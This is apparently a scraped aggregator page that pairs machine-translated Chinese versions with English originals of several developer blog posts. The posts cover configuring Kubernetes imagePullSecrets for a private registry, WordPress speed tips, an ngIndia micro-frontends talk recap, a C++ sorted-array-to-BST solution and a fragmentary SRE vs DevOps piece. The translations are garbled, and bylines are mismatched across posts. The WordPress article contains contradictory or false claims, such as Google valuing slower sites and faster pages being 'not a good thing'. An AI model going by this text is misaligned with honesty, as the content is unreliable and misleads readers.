item.title: 在 Kubernetes 中使用私有 docker 注册表 | Using private docker registry inside kubernetes
item.description:
使用 Digital Ocean Container Registry 配置客户 k8s 集群。

要求

  • 私有 docker 注册表（我使用 Digital Ocean 进行演示）
  • 访问像Dockerhub这样的公共 Docker 注册表中的公共镜像是 Kubernetes 集群的默认行为，除非您出于明显的安全原因想要集成自己的私有注册表来访问私有 Docker 镜像。 但是配置一个裸机 kubernetes集群以访问您的私有注册表需要几个步骤，包括更新部署/pod yaml。 我正在使用数字海洋码头注册作为参考。 但是大多数提供商的步骤是相同的​​。

如果您没有用于演示的集群。 签出种类。 或者你可以使用 Katacoda 或Play with kubernetes

第1步

首先，我们必须将集群配置为向私有注册表进行身份验证。 我们可以通过两种方法做到这一点。 第一种方法是使用config.json文件，第二种方法需要您的用户名、密码和电子邮件。
在数字海洋容器注册表中，您可以在容器注册表主页操作按钮处下载只读配置文件。 当您在本地机器上登录到 docker 注册表时，可以在~/.docker/config.json中找到相同的文件。

使用config.json

 kubectl create secret generic registry-credential \ --from-file = .dockerconfigjson = <path/to/.docker/config.json> \ --type = kubernetes.io/dockerconfigjson

或者

使用 docker 凭据

kubectl create secret docker-registry registry-credential --docker-server = <your-registry-server> --docker-username = <your-name> --docker-password = <your-pword> --docker-email = <your-email>

检查创建的秘密

kubectl get secret registry-credential --output = yaml

输出类似于：

 apiVersion : v1 kind : Secret metadata : ... name : registry-credential ... data : .dockerconfigjson : eyJodHRwczovL2luZGV4... type : kubernetes.io/dockerconfigjson

要将数据转换为可读格式，请使用以下命令。

 kubectl get secret registry-credential --output = "jsonpath={.data. \. dockerconfigjson}" | base64 --decode

第2步

编辑吊舱

创建秘密后，我们可以更新我们的 pod 配置以使用创建的秘密来提取图像。 如下更新您的 pod 的规范会话。

 spec : containers : - name : private-reg-container image : <your-private-image> imagePullSecrets : - name : registry-credential

要从私有注册表中提取映像，Kubernetes 需要凭据。 配置文件中的imagePullSecrets字段指定 Kubernetes 应该从名为registry-credential的 Secret 获取凭证。 创建一个使用您的 Secret 的 Pod，并验证该 Pod 是否正在运行

kubectl apply -f pod.yaml kubectl get pod <pod-name>

如果您不想将imagePullSecrets添加到您的 pod 配置中，或者需要将每个命名空间的不同注册表设置为默认值，请转到第 3 步。

第 3 步

将图像拉取机密添加到服务帐户

如果您想预览有关服务帐户的信息，请查看此文档
要将我们的新密钥添加到命名空间，我们必须修改服务帐户并将我们的新密钥名称推送到服务帐户内的imagePullSecret数组。 我们可以通过以下方式下载服务帐户清单

kubectl get serviceaccounts default -o yaml > ./service-account.yaml

然后更新如下：

 apiVersion : v1 kind : ServiceAccount metadata : creationTimestamp : 2015-08-07T22:02:39Z name : default namespace : default uid : 052fb0f4-3d50-11e5-b066-42010af0d7b6 secrets : - name : default-token-uudge imagePullSecrets : - name : registry-credential

最后用更新的清单文件替换服务帐户

kubectl replace serviceaccount default -f ./service-account.yaml

现在，当在当前命名空间中创建新 Pod 并使用默认 ServiceAccount 时，新 Pod 的spec.imagePullSecrets字段会自动设置。

参考：
将图像拉取密码添加到服务帐户

拉吉特保罗_#SaveSoil - Apr 17 4月17日



原文:

Configure a customer k8s cluster with Digital Ocean Container Registry.

Requirements

  • Kubernetes cluster (Access to the cluster via kubectl)
  • Private docker registry (I use Digital Ocean for demo)
  • Docker image

Accessing public images in a public docker registry like Dockerhub is the default behaviour of a kubernetes cluster, unless you want to integrate your own private registry to access private docker images for obvious security reasons. Cloud service providers like AWS, Digital Ocean provides easy integration between own docker registry to managed kubernetes.

But configuring a baremetal kubernetes cluster to access your private registry comes with couple of steps including updating the deployment/pod yaml. I am using digital ocean docker registry for the reference. But steps are same for most of the providers.

If you don't have a cluster for demo. Check out Kind. Kind helps you to run a kubernetes cluster locally in minutes. Or else you can use Katacoda or Play with kubernetes

Step 1

Dockerconfig.json

First we have to get the cluster configured to authenticate to the private registry. A Kubernetes cluster uses the Secret of kubernetes.io/dockerconfigjson type to authenticate with a container registry to pull a private image. We can do it in two methods. First method is to use the config.json file and the second method requires your username, password and email.
In digital ocean container registry you can download a read-only config file at container registry home Actions button. The same file can be found in ~/.docker/config.json when you login in to docker registry in your local machine.

Using config.json 

kubectl create secret generic registry-credential \ --from-file=.dockerconfigjson=<path/to/.docker/config.json> \ --type=kubernetes.io/dockerconfigjson

or

Using docker credentials 

kubectl create secret docker-registry registry-credential --docker-server=<your-registry-server> --docker-username=<your-name> --docker-password=<your-pword> --docker-email=<your-email>

Inspect created secret

kubectl get secret registry-credential --output=yaml

The output is similar to this:

apiVersion: v1
kind: Secret
metadata: ... name: registry-credential ...
data: .dockerconfigjson: eyJodHRwczovL2luZGV4...
type: kubernetes.io/dockerconfigjson

The value of the .dockerconfigjson field is a base64 representation of your Docker credentials. To convert the data into readable format use the following command.

kubectl get secret registry-credential --output="jsonpath={.data.\.dockerconfigjson}" | base64 --decode

Step 2

Editing the pod

Once the secret is created we can update our pod config to use the created secret to pull images. Update the spec session of your pod as follows.

spec: containers: - name: private-reg-container image: <your-private-image> imagePullSecrets: - name: registry-credential

To pull the image from the private registry, Kubernetes needs credentials. The imagePullSecrets field in the configuration file specifies that Kubernetes should get the credentials from a Secret named registry-credential. Create a Pod that uses your Secret, and verify that the Pod is running

kubectl apply -f pod.yaml
kubectl get pod <pod-name>

If you don't want to add imagePullSecrets to your pod config or need to set different registries per namespace as default then go to step 3.

Step 3

Adding image pull secretes to service account

If you want to get a preview about service accounts checkout this doc
To add our new secret to the namespace we have to modify the service account and push our new secret name to the imagePullSecret array inside the service account. We can download the service account manifest by

kubectl get serviceaccounts default -o yaml > ./service-account.yaml

then update it as follows:

apiVersion: v1
kind: ServiceAccount
metadata: creationTimestamp: 2015-08-07T22:02:39Z name: default namespace: default uid: 052fb0f4-3d50-11e5-b066-42010af0d7b6
secrets:
- name: default-token-uudge
imagePullSecrets:
- name: registry-credential

Finally replace the service account with updated manifest file

kubectl replace serviceaccount default -f ./service-account.yaml

Now, when a new Pod is created in the current namespace and using the default ServiceAccount, the new Pod has its spec.imagePullSecrets field set automatically.

References:
Pull an Image from a Private Registry
Add image pull secret to service account
Add image pull secret to service account

Rajit Paul_#SaveSoil - Apr 17
item.author: samthom

item.title: 减少 WordPress 网站加载时间的 10 种行之有效的方法 | 10 Proven Ways to Reduce WordPress Website Load Time
item.description:
普里亚莱

发表于您想提高或提高 WordPress 的速度吗？ 特别是 WordPress，目前是启动新网站的最佳和最受欢迎的平台之一。 另一方面，每日金额继续上升。 但是，有一个问题：大量用户在提供反馈，而 WordPress 速度很慢。 因此，他们有兴趣学习如何让 WordPress 运行得更快。 您不知道 WordPress 并没有您想象的那么慢。 它比市场上任何其他 CMS 都要快得多。 但是，您必须确保以正确的方式加速 WordPress。

提高 WordPress 速度的基础知识

我将介绍一些基本的问题和答案，以及加速 WordPress 的方法。 毫无疑问，它将帮助您扩展知识库并学习提高 WordPress 速度的基础知识。 让我们谈谈如何正确加速WordPress。

拥有一个快速加载的 WordPress 网站有什么好处？

您是否知道访问者加载网站仅需 7 秒，在某些情况下甚至更短？ 根据亚马逊的说法，如果他们的网站加载时间超过一秒，他们就会失去 7% 的转化率。 它甚至导致页面浏览量下降 11%，客户满意度下降 16%。
你能想象网站所有者会损失多少钱吗？ 另一方面，谷歌认为速度较慢的网站是值得的。 同样，尽量远离网站的范围。 牢记这一点，加速您的 WordPress 网站至关重要。

如何检查您的 WordPress 网站的速度？

那么，您能告诉我如何测试我的 WordPress 网站的速度吗？ 是的！ 如果您认为网站在几秒钟内即可加载，为什么还要仔细检查它们？ 另一方面，来自不同位置或计算机的新访问者将无法这样做。 因此，您可以使用 Pingdom 来测试 WordPress 网站的加载速度。 首先要记住的是，它是一个完全免费且非常有用的工具，用于确定 WordPress 网站的速度。
请记住，Pingdom 是一项免费服务，可让您在不同位置测试您的网站。 值得注意的是，在两秒内加载的网站是理想的，如果您可以稍微改进一下，您将获得更忠诚的客户。 尤其是毫秒，它会对您的 WordPress 网站的用户体验产生重大影响，而您甚至可能没有意识到这一点。

是什么减慢了 WordPress 网站的速度？

由于各种原因，WordPress 网站可能会变慢。 当您查看网站时，您将获得统计数据和网站速度变慢的原因。 也会有一些技术上的考虑。 但是，下面列出的原因是 WordPress 网站速度变慢的最常见原因。 网站托管 - 如果您的托管设置不正确，可能会导致您的网站加载缓慢。 您还必须安装缓存插件和其他扩展。 继续阅读; 我稍后会解释。 未优化的页面 - 包含大量大图像的页面可能会降低您的网站速度。 不必要的插件——插件会导致 WordPress 变慢。

外部脚本，例如广告和字体加载器，可能会导致 WordPress 网站速度变慢。

快速提高WordPress的速度：

因此，您已经意识到提高 WordPress 速度的重要性。 我将在本文中介绍如何使 WordPress 更快。 采纳建议并在您的网站上付诸实践。 它将显着提高 WordPress 的速度并帮助您在 Google 上排名，并改变您网站的用户体验。

如果您使用两种方法（安装缓存插件和优化图像），您的网站将非常快速地加载并在多个位置进行测试。 同样，完成也不会花很长时间。 现在由您决定是否让您的 WordPress 网站保持最新状态。 因此，让 WordPress 网站保持最新状态至关重要。 它将帮助您加速 WordPress、提高安全性并总体上优化您的网站。 同样，定期更新所有插件将确保 WordPress 运行得更快。

这是一种简单的方法，不需要对您网站的代码进行任何更改，并且非常有效。 实际上，您的网站页面是动态的。 因此，它的行为与静态不同。 当您请求动态页面时，它会不断搜索所有必要的信息和文件。 因此，页面需要更长的时间来加载。 如果您使用缓存插件，则可以减少页面加载所需的时间。 它无疑会提高您的 WordPress 网站的速度。 本质上，缓存插件会复制您的网站和页面。 当您请求页面时，它立即表明您是一个认真的人。 考虑到这一点，您将能够一次处理大量访问者，而无需等待响应。

但是，为了加速 WordPress，您应该使用哪些缓存插件？ 因此，“WP Super Cache”是最好的免费解决方案。 它经过精心设计和优化，您当然可以更改加载时间。


它有助于吸引访问者，80% 的访问者更喜欢视觉内容而不是文本。 同样，图像有可能破坏您的网站。 实际上，没有优化的大图像对任何网站都是不利的。 它可能会减少充电所需的时间。 因此，在提升品牌形象和创建视觉上吸引人的内容时，您应该使用图像，但也应该优化它们。 一般来说，PNG 图像非常适合 Web 发布，但颜色很多，JPEG 格式更可取。 另一方面，切勿使用未经优化的图像。 这将导致 WordPress 变慢。 使用任何图像编辑软件来优化您的网站图像的大小并将其保持在 50KB 以下。 它会让你的网站看起来更轻。 您还可以使用图像优化器插件（例如 ShortPixel Image Optimizer）来自动化该过程。

通常，WordPress 档案和主页、类别和标签会显示每个帖子的完整内容。 它将增加您网站的主页、类别和标签的权重。 这将使您的网站加载时间更长。 同样，您的访问者不需要一直看到您的所有内容。 他们会来选择他们需要的内容。 默认情况下包含这些 WordPress 功能。 你必须个性化它。 转到设置并选择内容摘要以对其进行自定义。 然后它将在整个地方显示内容摘录。 但是，您可以在主题选项中找到它。

您的网站是否收到大量反馈？ 这是您网站受欢迎程度的一个很好的指标。 获得它没有压力。 然而，当谈到加速 WordPress 时，它可能是一个障碍。 因为有很多评论的页面可能需要很长时间才能加载。 另一方面，垃圾邮件可以为您提供。 因此，Akismet 可用于过滤垃圾评论。 同样，要在页面上显示更少的评论，请使用设置中的评论摘录。 不会删除任何评论。 单击下一条或上一条评论将带您到上一条或上一条评论。 具体来说，它将帮助您提高 WordPress 的速度和转化率。

在加载 Facebook 帖子时，Twitter 会跟随按钮、照片、样式表和脚本，许多网站都会进行外部 HTTP 查询。 提高网站的速度并不是一件好事。 如果您的网站一直试图加载大量文件，您的页面速度将会变慢。 现在可以减少外部 HTTP 请求。 视频是一个很好的视觉内容示例，可以让访问者保持兴趣。 它还将帮助您提高转化率。 您将能够将您的视频上传到您的 WordPress 网站，并且会自动创建一个 HTML5 播放器来显示它们。 但是，视频的大小是一个问题。 当您在帖子中包含视频时，您的页面大小会增加。 但是，它将需要更多带宽。 相反，您可以使用 YouTube、Vimeo、DailyMotion 和其他流行的视频共享网站。 这将帮助您缩小页面。 毫无疑问，它将帮助您提高 WordPress 页面的速度。

要启动您的 WordPress 网站，您需要一个主题。 但是，有些主题特别吸引人或与众不同。 但是，它们的编码和优化效率低下。 它可能会减慢加载过程。 实际上，您应该使用编码良好且针对 SEO 优化的主题。 如果你有这样的主题，它将帮助你提高 WordPress 的速度。 更不用说它对 SEO 至关重要。 它也将使您的事情变得更容易。

滑块是通过允许您显示流行或有趣的材料来使您的网站对访问者更具吸引力的最有效方法之一。 但是，写得不好的滑块可能会导致 WordPress 变慢。 本质上，您必须选择一个您能够快速完成的任务。 如果您要使用插件来显示滑块，请确保它已针对速度进行了优化。 但是，您可以根据您的要求咨询其他来源。 使用更快的滑块插件无疑会提高 WordPress 的性能。

长篇文章是权威写作的必备品。 同样，谷歌排名也需要它。 另一方面，长帖子需要更长的时间来加载。 您可以降低页面的速度。 因此，在将帖子分成两页或三页时，您可以使用“下一步”按钮。

它将提高您网站的跳出率。 同样，提高 WordPress 页面的速度将是有益的。

克里斯·邦格斯—— Oct 11 '21 21 年 10 月 11 日



原文:

Priya Rai

Posted on May 27

Do you want to increase or improve WordPress's speed? WordPress, in particular, is currently one of the best and most popular platforms for launching new websites. WordPress is the most widely used blogging platform, with 70% of CMS users using it. The daily amount, on the other hand, continues to rise. However, there is one issue: a large number of users are providing feedback, and WordPress is slow. As a result, they're interested in learning how to make WordPress run faster. You're not aware that WordPress isn't as slow as you believe. It is significantly faster than any other CMS on the market. However, you must ensure that you are speeding up WordPress in the correct manner.

The fundamentals of increasing WordPress's speed

I'll go over some basic questions and answers, as well as ways to speed up WordPress. It will undoubtedly assist you in expanding your knowledge base and learning the fundamentals of increasing WordPress speed. Let's talk about how to properly speed up WordPress.

What are the benefits of having a fast-loading WordPress site?

Do you know that it takes only 7 seconds for a visitor to load a website, and in some cases even less? According to Amazon, if their websites take longer than one second to load, they lose 7% of their conversions. It even results in an 11% drop in page views and a 16% drop in customer satisfaction.
Can you imagine how much money a website owner could lose? Google, on the other hand, considers a slower website to be worthwhile. Similarly, try to stay out of a website's reach. Keeping this in mind, speeding up your WordPress websites is critical.

How to check the speed of your WordPress website?

So, could you tell me how I can test the speed of my WordPress site? Yes! Why should you double-check your websites if you think they load in a matter of seconds? Cookies are small text files that your browser, such as Google Chrome or Mozilla Firefox, saves to speed up the loading of a website. New visitors from various locations or computers, on the other hand, will be unable to do so. As a result, you can use Pingdom to test the loading speed of WordPress websites. The first thing to remember is that it's a completely free and extremely useful tool for determining the speed of your WordPress websites.
Remember that Pingdom is a free service that allows you to test your website in different locations. It's worth noting that a website that loads in under two seconds is ideal, and if you can improve even slightly, you'll gain a more loyal customer. Milliseconds, in particular, can have a significant impact on the user experience of your WordPress sites, and you may not even be aware of it.

What slows down the WordPress website?

WordPress websites can be slowed for a variety of reasons. You will get statistics and reasons why your websites are slowing down when you review them. There will also be some technical considerations. However, the reasons listed below are the most common causes of WordPress website slowdown. Website Hosting - If your hosting isn't set up properly, it can cause your websites to load slowly. WordPress Customization – If your websites are not properly customized, they will undoubtedly slow down. You must also install cache plugins and other extensions. Continue reading; I'll explain later. Unoptimized Page – A page with a lot of large images can slow down your website. Unnecessary Plugins – Plugins can cause WordPress to slow down.

External scripts, such as ads and font loaders, can cause WordPress websites to slow down.

Quickly increase the speed of WordPress:

So, you've realized the significance of increasing WordPress's speed. I'll go over how to make WordPress faster in this article. Take the advice and put it into practice on your websites. It will significantly improve WordPress speed and help you rank on Google, as well as change the user experience of your websites.

1. Updating your WordPress site is essential.

Your websites will load very quickly and will be tested in a variety of locations if you use two methods (install cache plugins and optimize images). Similarly, it will not take long to complete. Now it's up to you to keep your WordPress site current. WordPress releases new versions regularly. As a result, it is critical to keep WordPress websites current. It will help you speed up WordPress, improve security, and optimize your site in general. Similarly, updating all plugins regularly will ensure that WordPress runs faster.

2. Install a WordPress caching plugin

It is a simple method that does not require any changes to your website's code and is very effective. Your website page is, in fact, dynamic. As a result, it behaves differently than static. When you request a dynamic page, it constantly searches for all of the necessary information and files. As a result, the page takes longer to load. If you use a caching plugin, you can reduce the time it takes for a page to load. It will undoubtedly improve the speed of your WordPress site. Caching plugins, in essence, make a copy of your website and pages. When you request a page, it immediately demonstrates that you are a serious person. With this in mind, you'll be able to handle a large number of visitors at once without having to wait for a response.

But, to speed up WordPress, which caching plugins should you use? For this reason, " WP Super Cache " is the best free solution. It is extremely well-designed and optimized, and you can certainly alter the loading time.


3. Optimize images for speed Images are the lifeblood of any piece of content, and research shows that visual content can boost conversion rates. It aids in attracting visitors, with 80 percent of visitors preferring visual content to text. Similarly, an image has the potential to destroy your website. In reality, a large image with no optimization is bad for any website. It may reduce the amount of time it takes to charge. So, when it comes to improving your branding and creating visually appealing content, you should use images, but you should also optimize them. In general, a PNG image is excellent for web publishing, but with a lot of colors, a JPEG format is preferable. On the other hand, never use an image that hasn't been optimized. It will cause WordPress to slow down. Use any image editing software to optimize the size of your website image and keep it under 50KB. It will make your website appear lighter. You can also use an image optimizer plugin, such as ShortPixel Image Optimizer, to automate the process.

4. Use excerpts on the home page and in the archives

In general, WordPress archives and home pages, categories, and tags display full content for each post. It will increase the weight of your website's main page, categories, and tags. It will make your websites take longer to load. Likewise, your visitors do not need to see all of your content all of the time. They will come and select the content that they require. These WordPress features are included by default. You must personalize it. Go to Settings and choose a content summary to customize it. It will then display content excerpts all over the place. You will, however, find it in the theme options.

5. Split comments into pages

Are your websites receiving a lot of feedback? It's a good indicator of your website's popularity. There is no pressure to obtain it. However, when it comes to speeding up WordPress, it can be a hindrance. Because a page with a lot of comments can take a long time to load. On the other hand, spam can provide you with it. As a result, Akismet can be used to filter spam comments. Similarly, to display fewer comments on the page, use comment excerpts from the settings. No comments will be removed. Clicking on the next or previous comments will take you to the previous or previous comments. Specifically, it will aid you in increasing WordPress speed and conversion.

6. Reduce External HTTP Requests

When loading Facebook posts, Twitter follows buttons, photos, style sheets, and scripts, many websites make external HTTP queries. Increasing the speed of your websites is not a good thing to do. Your page speed will be slowed if your website attempts to load a large number of files all the time. External HTTP requests can now be reduced. WordPress's speed will undoubtedly improve.

7. Do not upload videos directly to WordPress

Video is a great example of visual content that will keep visitors interested. It will also assist you in increasing your conversion rate. You will be able to upload your videos to your WordPress sites, and an HTML5 player will be created automatically to display them. However, the video's size is an issue. When you include a video in your post, the size of your pages will grow. However, it will require more bandwidth. Instead, you can use YouTube, Vimeo, DailyMotion, and other popular video-sharing sites. This will help you to make your pages smaller. It will undoubtedly assist you in increasing the speed of your WordPress pages.

8. Use a theme that is optimized for WordPress websites that load quickly.

To launch your WordPress websites, you'll need a theme. However, some themes are particularly appealing or distinctive. However, they are inefficiently coded and optimized. It may slow down the loading process. Actually, you should use a theme that is well-coded and optimized for SEO. It will help you increase the speed of WordPress if you get a theme like that. Not to mention the fact that it is critical for SEO. It will also make things easier for you.

9. Use a faster slider plugin

A slider is one of the most effective ways to make your website more appealing to visitors by allowing you to display popular or intriguing material. However, a badly written slider can cause WordPress to slow down. Essentially, you must select one that you are capable of doing rapidly. If you're going to use a plugin to display the slider, make sure it's optimized for speed. Meteor Slides is a free tool that is well-optimized and loads your websites in less than 2 seconds. You can, however, consult another source for your requirements. Using a faster slider plugin would undoubtedly improve WordPress performance.

10. Split Long Posts into Pages

Long posts are a must for authoritative writing. In the same way, it is required for Google ranking. Long posts, on the other hand, take longer to load. You can reduce the pace of the page. As a result, while dividing the post into two or three pages, you can utilize the "Next" button.

It will improve your website's bounce rate. Similarly, increasing the speed of a WordPress page will be beneficial.

Chris Bongers - Oct 11 '21
item.author: priyarai1

item.title: 将面孔匹配到 Twitter DP #ngIndia | Matching faces to Twitter DPs #ngIndia
item.description:
猜猜我在说什么？

我被迫接受我们在参加在线会议时只是妥协了。

我认为无论如何，会议绝不只是消费会议提供的内容。 主要是关于网络，与人会面的温暖。 因此，当我们今年 5 月参加 ngIndia 2022 活动时，它是关于与过去两年在线债券中的那些人会面，而不是从屏幕后面联系。

所以，5 月 21 日，我有机会在 #ngIndia 上就“微前端”主题发表演讲。 现在我选择了这个主题，因为我目前正在@epilotGmbH使用微前端，还有什么比谈论在大型应用程序中使用微前端的成功和挑战更好的了。

所以我的准备工作确实包括解决与工作相关的问题，例如，工作中的跨微前端通信以及回家并试图通过我的幻灯片解释问题及其解决方案。

最后，我决定与Srashti Jain以角色扮演的形式进行演讲，以帮助听众更好地理解。

我——我希望我能在这家公司工作，但我已经有一段时间没有使用 X 框架了。

我们的产品基于微前端架构。 我们很乐意雇用您来研究您选择的框架并构建我们出色的产品。

我——哇，听起来很有趣！ 所以我现在不需要熟练掌握另一个框架（X 框架）来为这个产品做出贡献。 惊人的！

所以这就是我开始演讲的方式，以解释微前端如何使扩展团队和项目与框架无关。 但这不是它，我在这里分享我的幻灯片以了解所讨论的内容，但是，我们很快就会有录制的谈话，并准备在这里分享。

我谈论微前端的经历超出了我的预期，我与听众中的许多工程师进行了如此重要的对话。 我们的讨论围绕着开发人员如何使用 single-spa 框架来处理他们作为顶级路由器的微前端架构、开发人员如何在当前的 single-spa MFE 中面临路由问题、一些开发人员希望切换到微前端以实现从 AngularJS 等迁移。



会议有超过 500 人参与其中，包括喝咖啡的社交、午餐时的闲聊、谈话后的问题。

来自世界各地的演讲者在他们的演讲中分享了有趣的发现。 会议结束后举行了一场派对，演讲者和志愿者一起参加了食物、饮料、音乐、舞蹈等等！
在会前晚宴上，演讲者收到了来自 ngIndia 组织者Dhananjay Kumar的礼物和纪念品。


我一直很喜欢在 ngIndia 演讲，看着每年参加此活动的人们的爱，我很自豪能成为 ngIndia 的本土演讲者，因为这是我开始尝试在活动中演讲以分享我的学习的地方。


以下是会议中捕捉到的一些瞬间。

谢谢！！！

请继续关注谈话录音:)

https://www.ng-ind.com/ https://www.ng-ind.com/



原文:

Guess what I am talking about?

Year 2022, this was after more than 2 years that we got to be at an in-person conference, and gosh, the experience! I am forced to accept that we were simply compromising when being a part of the online conferences.

I think conferences were anyway never about only consuming the content delivered from the sessions. It was majorly about the networking, the warmth from meeting people. So when we we went to ngIndia 2022 event this May, it was about meeting those people from online bonds from the past two years and connecting NOT from behind the screens.

So, 21st May, I got the opportunity to speak at #ngIndia on the topic ‘Microfrontends’. Now I chose this topic because I am currently working with micro-frontends at @epilotGmbH, and what could be better than talking about the success and challenges of using micro-frontends for larges scale apps than this.

So my preparation did include solving issues related to, for example, cross-micro-frontend communication AT WORK and coming back home and trying to explain the problem and its solution from the day through my slides.

Finally I decided to do my talk in the form of a role-play with Srashti Jain to help audience understand better.

Me — I wish I could work for this company but I haven’t used X framework for a while now.

Srashti Jain (as a recruiter) — oh that’s not a problem at all! Our product is based on a micro-frontend architecture. We’d love to hire you to work on your choice of framework and build our awesome product.

Me — Wow that sounds interesting! So I don’t need to skill up in another framework (X framework) now to contribute to this product. Awesome!

So this is how I began my talk to explain how micro-frontends made scaling up teams and projects framework-agnostic. But thats not it, I am sharing my slides here to get a sense of what was discussed, however, we will soon have the recorded talk up soon and ready to be shared right here.

My experience speaking about micro-frontends was beyond my expectations, and I had such important conversations with many engineers from the audience. Our discussions revolved around how developers could use single-spa framework to deal with their micro-frontend architecture as the top level router, around how developers faced routing issues in their current single-spa MFEs, how some developers desired to switch to micro frontends to migrate from AngularJS etc.



The conference had more than 500 people joining in the fun, with the right element of over-coffee networking, over-lunch chit-chat, after-talk questions.

Speakers from all over the world shared interesting findings during their talks. The conference was followed by an after party where the speakers and the volunteers partied together with food, drinks, music, dance and what not!
During the pre-conference dinner, the speakers were felicitated with gifts and swags from ngIndia organiser, Dhananjay Kumar.


I always love to speak at ngIndia and looking at the love from people who attend this event yearly, I am proud to be a home grown speaker of ngIndia, saying this since this is where my foray into speaking at events to share my learning started.


Here are some of the captured moments from the conference.

Thank you!!!

Stay tuned for the talk recordings :)

https://www.ng-ind.com/

item.title: 数组到 BST（正确注释） | Array to BST (Proper Comments)
item.description:
// { Driver Code Starts #include<bits/stdc++.h> using namespace std; // } Driver Code Ends class Solution { public: //create a helper function //create a extra vector ds to store the elements void vectorutility(vector<int>&arr,int low,int high,vector<int>&ds){ int mid; //Nothing but to do binary search if(low<=high){ mid = low + (high-low)/2; ds.push_back(arr[mid]); vectorutility(arr,low,mid-1,ds); vectorutility(arr,mid+1,high,ds); } } //Create main array to bst convertion function vector<int> sortedArrayToBST(vector<int>& nums) { // Code here vector<int>ds; vectorutility(nums,0,nums.size()-1,ds);//Utility function that previuosly declared return ds; } }; // { Driver Code Starts. int main(){ int tc; cin >> tc; while(tc--){ int n; cin >> n; vector<int>nums(n); for(int i = 0; i < n; i++)cin >> nums[i]; Solution obj; vector<int>ans = obj.sortedArrayToBST(nums); for(auto i: ans) cout << i <<" "; cout << "\n"; } return 0; } // } Driver Code Ends

卡洛斯·多明格斯·帕德隆 - 鲍里斯拉瓦·基洛娃—— May 26 5月26日



原文: 

// { Driver Code Starts
#include<bits/stdc++.h>
using namespace std;

 // } Driver Code Ends
class Solution {
public:
//create a helper function
//create a extra vector ds to store the elements
void vectorutility(vector<int>&arr,int low,int high,vector<int>&ds){
    int mid;
//Nothing but to do binary search
    if(low<=high){
        mid = low + (high-low)/2;
        ds.push_back(arr[mid]);
        vectorutility(arr,low,mid-1,ds);
        vectorutility(arr,mid+1,high,ds);
    }
}
//Create main array to bst convertion function
    vector<int> sortedArrayToBST(vector<int>& nums) {
        // Code here

        vector<int>ds;
        vectorutility(nums,0,nums.size()-1,ds);//Utility function that previuosly declared
        return ds;
    }
};

// { Driver Code Starts.
int main(){
    int tc;
    cin >> tc;
    while(tc--){
        int n;
        cin >> n;
        vector<int>nums(n);
        for(int i = 0; i < n; i++)cin >> nums[i];
        Solution obj;
        vector<int>ans = obj.sortedArrayToBST(nums);
        for(auto i: ans)
            cout << i <<" ";
        cout << "\n";
    }
    return 0;
}  // } Driver Code Ends

Hit a 👍 for more such solutions.

item.title: SRE 与 DevOps - 差异和相互关系 | SRE vs. DevOps - The Differences and Interrelation
item.description:
科马尔-J-普拉巴卡

发表于软件开发生命周期已经走过了漫长的道路——从不重叠的开发模型——瀑布模型到像敏捷和 DevOps 这样的迭代开发模型。 有趣的是，在 DevOps 运动开始之前（~2007-2008），SRE 诞生于谷歌（2003 年），旨在构建整个谷歌基础设施的可靠性和弹性。 看看上面的例子，可以肯定地说，我们对应用程序的日益依赖是推动 DevOps 和 SRE 广泛采用的原因。 无论是简化我们的业务功能，还是推出一个简化我们生活的应用程序，我们在每一步都需要可靠且可扩展的系统。

什么是 DevOps？

它旨在消除孤岛并弥合不同开发和运营部门之间的差距。
在这个过程中，代码开发经历了持续开发、持续集成、持续测试、持续反馈、持续监控、持续部署和持续运营的迭代步骤。 也俗称“DevOps 生命周期的 7C”。

什么是 SRE？

站点可靠性工程或 SRE 在简化最终用户体验方面发挥着更全面的作用，并且更关心将软件开发实践融入 IT 运营。 简而言之，SRE 的概念是，如果开发人员处理 IT 运营的任务，那么哪些地方可以引入自动化。 这意味着它希望使用自动化来解决在生产中管理应用程序时出现的许多问题。

服务水平协议 (SLA) - 根据最终用户的需要定义应用程序的适当可靠性、性能和延迟。

  • 服务水平目标 (SLO) - SRE 团队为满足 SLA 的期望而设定的目标。
  • 服务水平指标 (SLI) - 衡量特定指标（如系统延迟、系统吞吐量、前置时间、平均恢复时间 (MTTR)、开发频率和可用性错误率）以符合 SLO。

    • 这两种方法都侧重于监控生产并确保运营管理按预期顺利进行。
  • 他们的基本原则之一是打破孤岛。 它旨在将应用程序开发中的所有利益相关者（开发团队 + 运营团队）聚集在一起。 相信“责任共担”和“共享所有权”的模式。
  • 他们的共同目标是简化分布式系统中的操作。

    • 开发和实施

    核心是为什么首先开发产品。 它适用于客户需求方面 - 不同的需求和规格。 通过构建、测试和部署的持续过程采用敏捷方法进行软件开发。
    产品是否满足客户的期望。 它监控应用程序性能的指标，并向 DevOps 团队提供有关需要实施的更改方向的反馈。

    技能的性质

    他们编写代码并不断测试它们是否存在错误，或者可能会添加新功能。 他们开发产品的核心设计，塑造它，并将其推向生产。 另一方面，SRE 团队本质上是调查性的。 他们不断监控相关指标，并就可能的改进方向提供反馈。 他们更关心最终用户的体验。 他们对每个问题进行分析，查看其频率，并找到自动化重复操作的方法。

    他们的目标是找到在重复出现的错误实例中进行创新的方法。

    自动化

    无论是 DevOps 还是 SRE，它们存在的唯一目的可以通过以下事实来区分，它们都旨在自动化手动流程。 这不仅仅是为了节省完成任务的时间，而且还超越了手动完成的任何事情都容易出错的事实。
    当谈到 DevOps 中的自动化时，这意味着自动化部署（任务和新功能）。 然而，SRE 中的自动化正在自动化冗余。 他们将手动任务转换为编程任务，以保持技术堆栈正常运行。

    目标

    曾经分配的每组任务都有一个与之相关的目标。 结论

    他们面临挑战的一些主要领域是：

    • 监控和警报：核心功能是帮助我们提高应用程序的可靠性。 获得对系统的360 度可见性将有助于诊断服务的健康状况并获得重要的分析。
    • 事件管理：要了解服务失败的原因、错误的严重性，甚至在任何请求开始失败时立即收到警报，都需要及时沟通。

    从托管服务市场规模的数据来看，预计到2026年将达到 2740 亿美元，这显示了它们在简化应用程序可管理性方面的潜力。 随着谷歌、亚马逊和 Netflix 等全球科技巨头率先采用 DevOps 和 SRE，他们的投资回报率突飞猛进。 此外，看看他们永不停机的健壮基础设施，很明显这些方法是长期存在的。
    一定要看看这里！ 关于DevSecOps 最佳实践的有见地的文章。

    考斯图布·特里维迪 - May 20 5月20日

    Adheeban Manoharan - Adheeban Manoharan - May 21 5月21日



    原文:

    Komal-J-Prabhakar

    Posted on May 27

